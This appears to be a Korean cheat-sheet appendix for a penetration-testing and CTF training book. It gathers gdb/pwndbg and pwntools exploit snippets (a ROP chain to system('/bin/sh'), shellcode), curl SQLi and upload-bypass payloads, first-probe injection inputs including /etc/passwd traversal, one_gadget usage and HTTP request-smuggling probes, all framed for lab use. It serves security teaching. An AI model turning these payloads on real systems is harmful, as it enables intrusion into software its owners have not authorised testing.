# 부록 B. 치트시트

| 레벨 | 상태 | 최종 개정 |
|---|---|---|
| 🟢 | 🔄 개정중 | 2026-10-22 |

> **한눈에 보기**
> 자주 찾는 명령과 페이로드 문법을 한 곳에. 실습 환경에서만 사용한다.
> 명령은 2026-10 기준 현행 버전(Docker Compose v2, gdb 15, pwntools 4.15, Semgrep 1.18x, CodeQL CLI 2.x)으로 확인했다.
> 9절은 시니어용이다. ROPgadget 7.x, ropper 1.13, one_gadget 2.1, pwninit 3.3, patchelf 0.18, binutils 2.42, Ghidra 12.1로 실행 확인했다.

## 1. Docker Compose 실습 명령

```bash
cd labs/web-sqli
docker compose up --build            # 빌드 후 전면 실행. Ctrl+C 로 중지
docker compose up --build -d         # 백그라운드
docker compose ps                    # 상태
docker compose logs -f web           # 서비스 로그 따라가기
docker compose exec web sh           # 컨테이너 안 쉘
docker compose restart web           # 코드 고친 뒤 재시작 (볼륨 마운트일 때)
docker compose up --build --force-recreate   # 이미지부터 다시
docker compose down                  # 중지·삭제
docker compose down -v               # 볼륨까지 삭제 = 초기화
docker compose config                # 최종 compose 설정 확인
```

포트 충돌(8080)은 Burp 기본 포트와 겹친다. Burp 쪽을 8081로 바꾸거나 `docker-compose.yml`의 `ports`를 `"127.0.0.1:8090:8080"`으로 바꾼다. 실습 앱은 항상 `127.0.0.1`에만 바인딩한다.

## 2. gdb / pwndbg

### 2.1 gdb 기본

| 명령 | 뜻 |
|---|---|
| `gdb -q ./bin` · `gdb -q -p PID` | 시작 / 프로세스 붙기 |
| `starti` · `run < in.txt` · `run $(python3 -c 'print("A"*100)')` | 첫 명령에서 정지 / 입력 파일 / 인자 |
| `break main` · `break *0x401136` · `tbreak` · `delete` | 중단점 (주소는 `*`) / 1회용 / 삭제 |
| `watch var` · `rwatch` · `awatch` | 쓰기 / 읽기 / 둘 다 감시 |
| `catch syscall execve` · `catch signal SIGSEGV` | 시스템 콜 / 시그널 잡기 |
| `continue` `next` `step` `nexti` `stepi` `finish` | 실행 제어 (`c n s ni si fin`) |
| `x/20gx $rsp` · `x/8i $rip` · `x/s 0x4020a0` | 메모리 덤프: 8바이트 hex 20개 / 명령 8개 / 문자열 |
| `info registers` · `p $rax` · `p/x $rsp` · `p &buf` · `p sizeof(buf)` | 레지스터·값 |
| `bt` · `frame 1` · `info frame` · `info locals` | 호출 스택 |
| `disassemble main` · `set disassembly-flavor intel` | 디스어셈블 (AT&T 기본 → Intel) |
| `info proc mappings` · `info sharedlibrary` · `info functions regex` | 메모리 맵 / 라이브러리 / 심벌 찾기 |
| `set follow-fork-mode child` · `set detach-on-fork off` | fork 추적 |
| `record full` · `reverse-step` · `reverse-continue` | 되감기 디버깅 (느림, 짧은 구간용) |
| `set disable-randomization off` | gdb는 기본으로 ASLR을 끈다. 실제 환경 재현 시 |
| `display/i $pc` · `undisplay` | 멈출 때마다 자동 출력 |

### 2.2 pwndbg 추가 명령

| 명령 | 뜻 |
|---|---|
| `context` · `regs` · `stack 30` | 멈출 때 보이는 화면 다시 / 레지스터 / 스택 30줄 |
| `telescope $rsp 20` · `telescope 0x... 8` | 포인터를 따라가며 덤프 (스택, 힙, 코드 표시) |
| `vmmap` · `vmmap $rip` · `xinfo 0x...` | 메모리 맵 / 주소가 어느 영역인지 |
| `search "flag"` · `search -t qword 0xdeadbeef` | 메모리 검색 (문자열 / 8바이트 값) |
| `checksec` · `piebase` · `libcinfo` | 보호 기법 / PIE 베이스 / libc 정보 |
| `got` · `plt` · `retaddr` · `canary` | GOT·PLT 표 / 스택의 리턴 주소들 / 카나리 값 |
| `cyclic 200` · `cyclic -l 0x6161616b` | 패턴 생성 / 크래시 값으로 오프셋 찾기 |
| `heap` · `bins` · `tcachebins` · `fastbins` · `vis-heap-chunks` · `malloc-chunk ADDR` | glibc 힙 (현행 문서의 명령 이름은 하이픈 표기. 구 버전은 `vis_heap_chunks`처럼 밑줄) |
| `nearpc` · `procinfo` · `dumpargs` · `distance A B` | 현재 코드 근처 / 프로세스 정보 / 호출 인자 / 주소 간 거리 |

## 3. pwntools 스니펫

```python
from pwn import *
context(arch="amd64", os="linux", log_level="info")   # 기본은 i386. 반드시 지정
context.terminal = ["tmux", "splitw", "-h"]            # gdb.attach 창

elf  = ELF("./vuln")                      # checksec 자동 출력
libc = ELF("./libc.so.6")
p = process("./vuln")                     # 또는 remote("127.0.0.1", 1337)
# p = gdb.debug("./vuln", gdbscript="break *main+40\ncontinue")   # gdb 아래서 시작

p.recvuntil(b"name: ")                    # 구분자까지 읽기 (drop=False 기본)
p.sendline(b"A" * 8)
p.sendlineafter(b"> ", b"1")              # 프롬프트 기다렸다가 보내기
leak = u64(p.recvline(keepends=False)[-6:].ljust(8, b"\x00"))   # 6바이트 주소 복원
libc.address = leak - libc.symbols["puts"]
log.success(f"libc @ {libc.address:#x}")

# 오프셋 찾기
payload = cyclic(200)                     # 'aaaabaaacaaa...' (n=4 기본)
# 크래시 후 RSP 값: cyclic_find(0x6161616b) → 40

# ROP
rop = ROP([elf, libc])
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
ret = rop.find_gadget(["ret"])[0]         # 스택 정렬용
payload = flat(b"A" * 40, ret, rop.chain())   # flat/fit: 바이트·정수 섞어 직렬화

# 셸코드
sc = asm(shellcraft.sh())                 # context.arch 기준
p.send(payload)
p.interactive()
```

```bash
pwn checksec ./vuln                  # = checksec ./vuln
pwn cyclic 200 ; pwn cyclic -l 0x6161616b
pwn template ./vuln --host 127.0.0.1 --port 1337 > exploit.py
pwn shellcraft -f asm amd64.linux.sh
pwn libcdb file ./libc.so.6          # libc 식별
```

## 4. Semgrep / CodeQL

```bash
# Semgrep
semgrep scan --config auto .                              # 레지스트리 추천 룰 (로그인 필요할 수 있음)
semgrep scan --config p/default --metrics=off .           # 기본 보안·품질 룰, 텔레메트리 끔
semgrep scan --config p/sql-injection --config p/owasp-top-ten --severity ERROR .
semgrep scan --config rules/ --json -o out.json .         # 직접 쓴 룰, JSON 저장
semgrep scan --config rules/ --sarif -o out.sarif .       # SARIF (GitHub Code Scanning 업로드용)
semgrep scan -e '$DB.execute(f"...")' -l python .         # 룰 파일 없이 패턴 하나
semgrep scan --exclude tests --include 'src/**' --config p/python .
semgrep --validate --config rules/                        # 룰 문법 검사 (semgrep.dev 접속 필요)
semgrep --test rules/                                     # 룰 테스트 (# ruleid: 주석 기반)
#   1.182: 하위 명령 `semgrep validate rules/`, `semgrep test rules/`도 같은 일을 한다 (EXPERIMENTAL)
semgrep ci --config rules/ --baseline-commit origin/main  # 변경분만

# CodeQL
codeql resolve languages                                  # 지원 언어 목록
codeql database create db --language=python --source-root=.
codeql database create db --language=java-kotlin --command="mvn -q package"   # 컴파일 언어는 빌드 명령
codeql pack download codeql/python-queries                # 쿼리 팩 받기
codeql database analyze db codeql/python-queries \
  --format=sarif-latest --output=results.sarif --download
codeql database analyze db codeql/python-queries:codeql-suites/python-security-extended.qls \
  --format=csv --output=results.csv
codeql query run my.ql --database=db                      # 쿼리 하나만
```

Semgrep 룰 한 장의 뼈대는 [제2편 보고 3장 5절](../vol2-tech/part8-reporting/03-patch-verification.md)에 있다.

## 5. HTTP 요청 조작 체크리스트

```bash
# 요청 보기·고치기 (curl)
curl -v http://127.0.0.1:8080/item?id=1                         # 요청·응답 헤더 전부
curl -s -X POST http://127.0.0.1:8080/login \
  --data-urlencode "username=admin'-- " --data-urlencode "password=x"   # 폼, 자동 인코딩
curl -s --get --data-urlencode "q=' UNION SELECT 1,2-- " http://127.0.0.1:8080/search  # 쿼리 문자열
curl -s -H "Content-Type: application/json" -d '{"id":1}' http://127.0.0.1:8080/api   # JSON
curl -s -b "session=abc" -c jar.txt http://127.0.0.1:8080/      # 쿠키 보내기 / 저장
curl -s -H "X-Forwarded-For: 127.0.0.1" -H "Host: internal" URL # 헤더 변조
curl -s -o /dev/null -w "%{http_code} %{time_total}\n" URL      # 상태 코드·응답 시간 (블라인드용)
curl -s -F "file=@shell.php;type=image/png" URL/upload          # multipart, Content-Type 속임
```

| 확인할 것 | 방법 |
|---|---|
| 모든 입력 위치 | 경로·쿼리·헤더·쿠키·본문(폼/JSON/XML/multipart). 숨은 필드, `Referer`, `User-Agent` 포함 |
| 메서드 바꾸기 | `GET`↔`POST`, `PUT`, `DELETE`, `OPTIONS`. 접근 제어가 메서드별로 다를 때가 있다 |
| 타입 바꾸기 | 숫자→문자열, 문자열→배열(`id[]=1`), JSON 타입 변경(`"1"`→`1`→`true`→`null`) |
| 인코딩 | URL 인코딩 두 번, 유니코드 정규화, `%00`, `%0d%0a` |
| 상태 코드 비교 | 같은 요청을 인증 있음/없음, 내 ID/남의 ID로 보내 200·302·403 비교 |
| 응답 시간 | 시간 기반 블라인드. 5초 지연은 `%{time_total}` 로 |
| 캐시·중간 장비 | `Cache-Control`, `Vary`, `X-Cache` 헤더. 프록시 뒤의 경로 정규화 차이 |
| 세션 | 로그아웃 후 같은 쿠키로 재요청. 다른 브라우저에서 같은 토큰 |

## 6. checksec 결과 해석

pwntools `checksec` 출력 기준이다. 같은 이름의 셸 스크립트(checksec.sh)는 열 이름이 조금 다르다.

```
[*] '/bin/ls'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

| 항목 | 값 | 뜻 | 공격자에게 |
|---|---|---|---|
| RELRO | `No RELRO` / `Partial RELRO` / `Full RELRO` | GOT 쓰기 보호. Partial은 GOT가 쓰기 가능 | Partial 이하면 GOT 덮어쓰기 가능 |
| Stack | `Canary found` / `No canary found` | 스택 카나리 | 없으면 리턴 주소 직접 덮기. 있으면 누출 필요 |
| NX | `NX enabled` / `NX disabled` | 스택·힙 실행 금지 | 켜져 있으면 셸코드 대신 ROP |
| PIE | `PIE enabled` / `No PIE` | 코드 주소 무작위화 | 없으면 코드·GOT 주소가 고정. 있으면 누출 필요 |
| Stack: `Executable` · RWX | `Has RWX segments` | 실행 가능 스택 / RWX 세그먼트 | 있으면 셸코드 직접 실행 |
| RPATH / RUNPATH | 경로 | 라이브러리 검색 경로 하드코딩 | 쓰기 가능한 경로면 라이브러리 바꿔치기 |
| FORTIFY | `Enabled` | `_FORTIFY_SOURCE` 길이 검사 버전 사용 | `strcpy` 류 일부 차단 |
| SHSTK / IBT | `Enabled` | 인텔 CET 섀도 스택 / 간접 분기 추적 | CPU·커널이 지원할 때만 유효. ROP·JOP 제약 |
| Stripped / Debuginfo | `No` / `Yes` | 심벌·디버그 정보 유무 | 출력되면 분석이 쉬운 쪽 |
| Packer | `Packed with UPX` | 패킹 | 언패킹 먼저 |

마지막 네 줄은 해당할 때만 출력된다. 아무것도 안 나오면 "스트립됨, 디버그 정보 없음, 패킹 안 됨"이다.

## 7. CVSS 3.1 메트릭 약어표

| 그룹 | 약어 | 이름 | 값 |
|---|---|---|---|
| 기본 | AV | Attack Vector 공격 벡터 | N 네트워크 · A 인접 · L 로컬 · P 물리 |
| 기본 | AC | Attack Complexity 공격 복잡도 | L · H |
| 기본 | PR | Privileges Required 필요 권한 | N · L · H |
| 기본 | UI | User Interaction 사용자 상호작용 | N · R 필요 |
| 기본 | S | Scope 범위 | U 변화 없음 · C 변화 |
| 기본 | C / I / A | 기밀성 / 무결성 / 가용성 영향 | H · L · N |
| 시간 | E | Exploit Code Maturity | X · U 미확인 · P 개념 증명 · F 동작 · H 고도 |
| 시간 | RL | Remediation Level | X · O 공식 · T 임시 · W 우회 · U 없음 |
| 시간 | RC | Report Confidence | X · U 미확인 · R 합리적 · C 확인 |
| 환경 | CR / IR / AR | 보안 요구 수준 | X · L · M · H |
| 환경 | MAV MAC MPR MUI MS MC MI MA | 수정된 기본 메트릭 | 기본과 같음 + X |

등급: None 0.0 · Low 0.1–3.9 · Medium 4.0–6.9 · High 7.0–8.9 · Critical 9.0–10.0. 벡터는 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` 형식. 4.0은 S가 없고 VC/VI/VA·SC/SI/SA, AT, UI N/P/A가 있다([제2편 보고 2장](../vol2-tech/part8-reporting/02-severity.md)).

## 8. 유형별 첫 탐지 입력

"따옴표 하나" 수준의 **첫 입력**과 그때 봐야 할 반응이다. 실습 환경·공개 연습 사이트 기준이며, 후보를 찾는 용도이지 증명이 아니다.

| 유형 | 첫 입력 | 보는 것 | 다음 단계 |
|---|---|---|---|
| SQLi | `'` → `' AND '1'='1` / `' AND '1'='2` | 500·DB 오류 / 두 응답의 차이 | 시간 지연, UNION. [제2편 웹 1장](../vol2-tech/part3-web/01-sql-injection.md) |
| XSS | `<u>x</u>` → `"><svg onload=alert(1)>` | 태그가 렌더링되는가 / 어떤 문맥(속성·JS·URL)인가 | 문맥별 페이로드. [제2편 웹 2장](../vol2-tech/part3-web/02-xss.md) |
| SSRF | `http://127.0.0.1:80/` · `http://127.0.0.1:22/` | 응답 내용·시간·오류 메시지 차이 | 내부 주소 대역, 메타데이터 주소. [제2편 웹 3장](../vol2-tech/part3-web/03-ssrf.md) |
| IDOR | 내 `id=1001` → `id=1000` | 남의 데이터가 오는가. 200 vs 403 | 순차/UUID, 쓰기 동작. [제2편 웹 5장](../vol2-tech/part3-web/05-access-control.md) |
| 경로 조작 | `../../../../etc/passwd` · `..%2f` | `root:x:0:0` | 인코딩 변형, 널 바이트. [제2편 웹 6장](../vol2-tech/part3-web/06-file-upload-path-traversal.md) |
| 파일 업로드 | `.php` → `.phtml` · `.php.png` · Content-Type만 이미지 | 저장 경로가 응답에 보이는가, 실행되는가 | 폴리글롯, 경로 조작 결합 |
| XXE | `<!DOCTYPE a [<!ENTITY x "t">]><r>&x;</r>` | `t`가 응답에 나오는가 | `SYSTEM "file:///etc/passwd"`. [제2편 웹 8장](../vol2-tech/part3-web/08-xxe.md) |
| SSTI | `{{7*7}}` · `${7*7}` · `<%= 7*7 %>` | `49`가 나오는가 | 엔진 식별 트리. [제2편 웹 9장](../vol2-tech/part3-web/09-ssti.md) |
| 명령 인젝션 | `;id` · `\| id` · `` `id` `` · `$(sleep 5)` | `uid=` 출력 / 5초 지연 | 블라인드면 시간·DNS |
| 역직렬화 | `rO0AB`(Java) · `O:4:`(PHP) · `gASV`(Python pickle) 로 시작하는 값 찾기 | 입력이 직렬화 객체인가 | 가젯 체인. [제2편 웹 7장](../vol2-tech/part3-web/07-deserialization.md) |
| 경쟁 조건 | 같은 요청 20개 동시 전송 (Burp Repeater 그룹, `parallel`) | 쿠폰·잔액이 두 번 적용되는가 | 창 넓히기. [제2편 웹 10장](../vol2-tech/part3-web/10-race-condition.md) |
| 스택 오버플로 | `python3 -c 'print("A"*2000)'` | SIGSEGV, RSP/RIP에 `0x4141...` | `cyclic`으로 오프셋. [제2편 바이너리 2장](../vol2-tech/part4-binary/02-stack-overflow.md) |
| 포맷 스트링 | `%x.%x.%x.%x` · `%s` | 스택 값이 찍히는가 / 크래시 | `%n` 쓰기. [제2편 바이너리 3장](../vol2-tech/part4-binary/03-format-string.md) |
| 정수 오버플로 | `-1` · `2147483648` · `4294967295` · `0` | 길이·개수 검사 우회, 큰 할당, 크래시 | [제2편 바이너리 6장](../vol2-tech/part4-binary/06-integer-overflow.md) |

## 9. 시니어용

실습 환경·허가받은 대상에서만 쓴다. 이 절의 명령은 모두 Ubuntu 24.04(glibc 2.39)에서 로컬 바이너리로 실행 확인했다.

### 9.1 가젯 찾기와 one_gadget

```bash
# ROPgadget (pip install ROPgadget)
ROPgadget --binary ./vuln --only "pop|ret"                       # pop·ret만으로 된 가젯
ROPgadget --binary ./libc.so.6 --only "pop|ret" --re "pop rdi"   # 정규식으로 좁히기 → 0x2a873 : pop rdi ; pop rbp ; ret
ROPgadget --binary ./libc.so.6 --string "/bin/sh"                # 문자열 주소 → 0x1cc42f
ROPgadget --binary ./vuln --ropchain                             # execve 체인 자동 생성 시도 (정적 링크 바이너리에서 유용)
# ropper (pip install ropper)
ropper --file ./libc.so.6 --search "pop rdi; ret" --nocolor      # 0x10c08d: pop rdi; ret;
ropper --file ./vuln --search "syscall" --nocolor ; ropper --file ./vuln --jmp rsp   # 특정 명령 / jmp·call reg
# one_gadget (gem install one_gadget. Ruby 필요. 미설치면 `gem install one_gadget --no-document`)
one_gadget ./libc.so.6                 # "셸 띄우는 한 주소" 후보와 조건. glibc 2.39: 0x583ec posix_spawn(..., "/bin/sh", ...)
one_gadget ./libc.so.6 -l 1            # 조건이 더 까다로운 후보까지 (2.39에서 17개)
one_gadget ./libc.so.6 --near printf   # 특정 함수 근처 후보 (부분 덮어쓰기용)
```

출력의 `constraints`(예: `rsp & 0xf == 0`, `rbx == NULL`)가 ROP 체인 끝에서 실제로 성립하는지 gdb로 확인한 뒤 쓴다. 조건이 안 맞으면 다음 후보로 넘어간다.

### 9.2 libc 맞추기: patchelf·pwninit

익스플로잇의 오프셋은 **대상 환경의 libc**가 정한다. 받은 libc·ld로 로컬 바이너리를 돌린다.

```bash
strings ./libc.so.6 | grep "GNU C Library"      # GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.9) ...
pwn libcdb file ./libc.so.6                     # 식별. 없으면 https://libc.rip 에 심벌 주소 몇 개로 조회
patchelf --print-interpreter ./vuln ; patchelf --print-needed ./vuln
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln   # 받은 ld·libc를 쓰도록 바꿈 (원본은 복사해 둔다)
# pwninit (cargo install pwninit, 또는 GitHub 릴리스 바이너리). 디렉터리의 bin·libc·ld를 찾아 위 작업 + solve.py 뼈대
pwninit                                         # bin: ./vuln  libc: ./libc.so.6 → vuln_patched, solve.py
pwninit --no-template                           # solve.py 생성 생략. --bin/--libc/--ld 로 직접 지정 가능
```

`pwninit`은 ld가 없으면 Ubuntu launchpad에서 같은 버전의 `libc6` .deb을 내려받아 꺼내고(`libc6-dbg`로 심벌도 복원), 오프라인이면 경고만 내고 `vuln_patched`·`solve.py`까지는 만든다(실측).

### 9.3 strace · ltrace · objdump · readelf

```bash
strace -f -e trace=execve,openat,read,write -o st.log ./vuln     # 자식 포함, 시스템 콜 선택, 파일로
strace -e trace=%network -s 256 -p PID                          # 실행 중 프로세스, 문자열 256바이트까지
strace -e inject=openat:error=ENOENT -e trace=openat ./vuln      # 장애 주입 (오류 경로 테스트)
ltrace -e 'read+printf+puts' ./vuln                             # 라이브러리 호출 선택
ltrace -S -f ./vuln                                             # 시스템 콜(SYS_*)까지, 자식 포함
objdump -d -M intel --no-show-raw-insn ./vuln                   # Intel 문법, 기계어 바이트 생략
objdump -d -M intel --disassemble=win ./vuln                    # 함수 하나만
objdump -s -j .rodata ./vuln ; objdump -R ./vuln                # 섹션 덤프 / 동적 재배치(GOT 슬롯)
objdump -T ./libc.so.6 | grep " system$"                        # 동적 심벌 오프셋 → 0x58750
readelf -h ./vuln                                               # Type: EXEC(No PIE) / DYN(PIE)
readelf -lW ./vuln | grep -E "GNU_STACK|GNU_RELRO"              # RWE면 실행 가능 스택
readelf -dW ./vuln | grep -E "NEEDED|FLAGS|RPATH|RUNPATH"       # BIND_NOW = Full RELRO
readelf -sW ./vuln | grep -E " win| main" ; readelf -rW ./vuln  # 심벌 / 재배치
readelf -S ./vuln | grep -E "\.got|\.plt|\.fini_array"          # 섹션 주소
readelf -n ./vuln | grep "x86 feature"                          # IBT, SHSTK
```

### 9.4 Ghidra headless

```bash
GHIDRA=/opt/ghidra_12.1_PUBLIC                                  # 설치 경로
$GHIDRA/support/analyzeHeadless /abs/proj demo -import /abs/vuln \
  -scriptPath /abs/scripts -postScript ExportFuncs.java /abs/funcs.txt -deleteProject
# 경로는 절대 경로. "./"로 시작하면 "Path element starting with '.' is not permitted"
# -process (기존 프로젝트 재분석) · -recursive · -overwrite · -readOnly · -noanalysis · -analysisTimeoutPerFile 600 · -preScript
# .py 스크립트는 PyGhidra로 시작해야 한다 ("Ghidra was not started with PyGhidra"). Java 스크립트가 기본
```

```java
// ExportFuncs.java — 함수 주소·이름을 파일로 쓰는 최소 후처리 스크립트 (실측 출력: 00401196 win / 004011b0 greet / 00401213 main)
import ghidra.app.script.GhidraScript;
import ghidra.program.model.listing.Function;
import java.io.PrintWriter;
public class ExportFuncs extends GhidraScript {
    @Override public void run() throws Exception {
        String[] a = getScriptArgs();
        try (PrintWriter out = new PrintWriter(a.length > 0 ? a[0] : "funcs.txt")) {
            for (Function f : currentProgram.getFunctionManager().getFunctions(true))
                out.println(f.getEntryPoint() + " " + f.getName());
        }
    }
}
```

### 9.5 glibc 버전별 힙 검사 요약

[제2편 바이너리 4장 7.2절](../vol2-tech/part4-binary/04-heap.md)의 표 요약이다. 버전은 glibc 소스 태그로 확인한 것이다.

| glibc | 바뀐 것 | 기법에 미친 영향 |
|---|---|---|
| 2.24 | `_IO_FILE` vtable 검증(`IO_validate_vtable`) | 구역 밖 가짜 vtable 차단. 구역 안 vtable(`_IO_wfile_jumps` 등)로 우회 |
| 2.26 | tcache 도입 | poisoning·double free가 가장 쉬운 시기(~2.28) |
| 2.28 | unsorted bin 제거 시 `bck->fd` 검사. `_IO_str_jumps` 버퍼 함수 포인터 제거 | unsorted bin attack 차단. house of orange의 `_IO_str_overflow` 경로 차단 |
| 2.29 | tcache `key` double free 검사. top chunk size 검사 | 단순 double free 차단(`key` 덮으면 통과). house of force 차단 |
| 2.30 | large bin `nextsize`/`bk` 검사 | largebin attack 한 분기 차단 |
| 2.32 | safe-linking + 정렬 검사 (tcache·fastbin) | 포이즈닝에 힙 주소 누출 필요 |
| 2.34 | `__malloc_hook`/`__free_hook` 제거. `tcache_key` 랜덤 | 훅 종착지 소멸. `key` 복원 불가(다른 값 덮기는 가능) |
| 2.38 | libio vtable을 `__io_vtables[]` 배열로 통합 | 검사 성격 동일 |
| 2.42 | large bin 남은 분기에도 `nextsize` 검사 | largebin attack 차단 |
| master (2.42.9000) | `malloc.c`에서 fastbin 코드 제거 | fastbin dup 계열 소멸. 2.43 릴리스 확인 필요 |

### 9.6 요청 스머글링 탐침 바이트열

[제2편 웹 12장 3.2절](../vol2-tech/part3-web/12-http-request-smuggling.md)의 시간 지연 탐침이다. `\r\n`은 실제 CRLF다. Burp Repeater에서는 **Update Content-Length를 끄고** 보낸다. **CL.TE 탐침을 먼저** 보낸다(순서를 바꾸면 CL.TE 환경에서 실제 데싱크가 난다).

```http
POST / HTTP/1.1               ← CL.TE 탐침. 프런트(CL=4)는 "1\r\nA" 까지만 넘기고,
Host: lab                        백엔드(TE)는 "A" 다음 청크를 기다린다 → 지연
Transfer-Encoding: chunked
Content-Length: 4

1\r\n
A\r\n
X
```

```http
POST / HTTP/1.1               ← TE.CL 탐침. 프런트(TE)는 "0\r\n\r\n" 까지만 넘기고,
Host: lab                        백엔드(CL=6)는 1바이트를 더 기다린다 → 지연
Transfer-Encoding: chunked
Content-Length: 6

0\r\n
\r\n
X
```

지연이 보이면 응답 차이(스머글한 `GET /404` 뒤의 정상 요청이 404를 받는지)로 확정한다. TE 난독화 변형: `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`, `Transfer-Encoding: chunked` 두 줄, `X: X[\n]Transfer-Encoding: chunked`.

### 9.7 역직렬화 지문

입력·쿠키·파라미터·파일에서 이 패턴이 보이면 [제2편 웹 7장](../vol2-tech/part3-web/07-deserialization.md)이다. 바이트열과 base64 둘 다 찾는다(로컬에서 직렬화해 확인).

| 형식 | 바이트 / 문자 | base64 시작 | 비고 |
|---|---|---|---|
| Java `ObjectOutputStream` | `AC ED 00 05` | `rO0AB` | STREAM_MAGIC 0xACED + 버전 5. `.ser` 파일, JSF ViewState, RMI·JMX |
| PHP `serialize` | `O:8:"stdClass":0:{}` · `a:1:{s:1:"a";i:1;}` | `Tzo` (`O:`) | 객체 `O:길이:"클래스":수:{...}`, 배열 `a:`, 문자열 `s:`, 정수 `i:` |
| Python pickle | `\x80\x04\x95` (프로토콜 4·5) · `\x80\x03` · `\x80\x02` | `gASV` · `gAN` · `gAJ` | 0x80 = PROTO, 다음 바이트가 프로토콜 번호. 4부터 0x95 FRAME |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF 01 00 00 00 00 00 00 00` | `AAEAAAD/////AQAAAAAAAAA` | MS-NRBF SerializationHeaderRecord(RootId 1, HeaderId -1, 버전 1.0). ViewState·`.NET Remoting` |
| Ruby `Marshal` | `\x04\x08` | `BAh` | Marshal 4.8. Rails 세션 쿠키(구버전)·캐시 |
| Node `node-serialize` | `_$$ND_FUNC$$_function` | — | 문자열 표식. IIFE `(){...}()`가 붙으면 즉시 실행 |

## 체크리스트

- [ ] 실습 앱을 띄우고 내리고 초기화하는 명령 세 개를 안 보고 칠 수 있는가?
- [ ] gdb에서 특정 주소에 중단점을 걸고 스택 20줄을 덤프할 수 있는가?
- [ ] pwntools로 로컬 프로세스에 연결해 `cyclic`으로 오프셋을 찾을 수 있는가?
- [ ] Semgrep 룰 하나를 쓰고 `validate`·`test`를 통과시킬 수 있는가?
- [ ] `curl` 만으로 쿠키·헤더·JSON 본문을 조작할 수 있는가?
- [ ] checksec 출력을 보고 "어떤 공격이 막혀 있는가"를 말할 수 있는가?
- [ ] (시니어) 받은 libc로 바이너리를 패치해 돌리고, `one_gadget`의 조건을 gdb로 확인할 수 있는가?
- [ ] (시니어) 대상 glibc 버전을 보고 9.5 표에서 쓸 수 있는 기법과 막힌 기법을 가를 수 있는가?

## 더 읽기

- [pwntools 문서](https://docs.pwntools.com/en/stable/) · tubes, ELF, ROP, cyclic
- [pwndbg 명령 목록](https://pwndbg.readthedocs.io/en/latest/commands/) · 분류별 명령
- [GDB 매뉴얼](https://sourceware.org/gdb/current/onlinedocs/gdb/) · `x`, `catch`, `record`
- [Semgrep CLI reference](https://semgrep.dev/docs/cli-reference) · [Writing rules](https://semgrep.dev/docs/writing-rules/overview)
- [CodeQL CLI 문서](https://codeql.github.com/docs/codeql-cli/) · `database create` / `analyze`
- [Docker Compose CLI reference](https://docs.docker.com/reference/cli/docker/compose/)
- [curl 매뉴얼](https://curl.se/docs/manpage.html)
- [FIRST CVSS v3.1 Specification](https://www.first.org/cvss/v3.1/specification-document)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) · 유형별 페이로드 모음 (실습 환경에서만)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) · [ropper](https://github.com/sashs/Ropper) · [one_gadget](https://github.com/david942j/one_gadget) · [pwninit](https://github.com/io12/pwninit) · [patchelf](https://github.com/NixOS/patchelf) · 9.1~9.2 도구
- Ghidra 설치 디렉터리의 `support/analyzeHeadlessREADME.html` (12.1 배포본에 포함) · 9.4 옵션 전체. [Ghidra 저장소](https://github.com/NationalSecurityAgency/ghidra)
- [MS-NRBF: .NET Remoting Binary Format](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/) · 9.7 .NET 헤더 레코드의 1차 자료

## 변경 이력

| 날짜 | 변경 | 기여자 |
|---|---|---|
| 2026-10-21 | 초안(뼈대) 작성 | @anthonynoh5202 |
| 2026-10-22 | 본문 작성. Compose, gdb/pwndbg, pwntools, Semgrep/CodeQL, HTTP, checksec, CVSS, 첫 탐지 입력 | @anthonynoh5202 |
| 2026-10-22 | 기술 검증: pwntools 4.15 API(context 기본 i386, recvuntil/recvline 시그니처, cyclic_find=40, flat, Gadget[0], pwn template/libcdb/shellcraft 옵션)·checksec 출력, gdb 15.1 명령, semgrep 1.182 validate/test/ci 옵션, docker compose 플래그를 실제 실행으로 대조. pwndbg 힙 명령 이름을 현행 문서의 하이픈 표기로 수정 | 검증팀 |
| 2026-10-22 | 독자 테스트 반영: Semgrep `validate`/`test`를 도구 부 5장과 같은 플래그 형식으로 통일(하위 명령은 주석으로). 장 참조에 편 표기 추가 | @anthonynoh5202 |
| 2026-10-23 | 독자 테스트 2차 반영: 9절 "시니어용" 신설. ROPgadget/ropper/one_gadget(gem 설치 후 glibc 2.39 libc로 실행), patchelf·pwninit(cargo 설치, 오프라인 동작 확인), strace/ltrace/objdump/readelf 플래그, Ghidra 12.1 headless(Java 후처리 스크립트 실행 확인, 절대 경로·PyGhidra 제약), glibc 버전별 힙 검사 요약표(4장 7.2절과 동일 출처), 스머글링 탐침(웹 12장 3.2절과 동일 바이트열), 역직렬화 지문(Java·pickle·PHP·Ruby는 로컬 직렬화로 확인, .NET은 MS-NRBF 헤더에서 base64 계산) | @anthonynoh5202 |
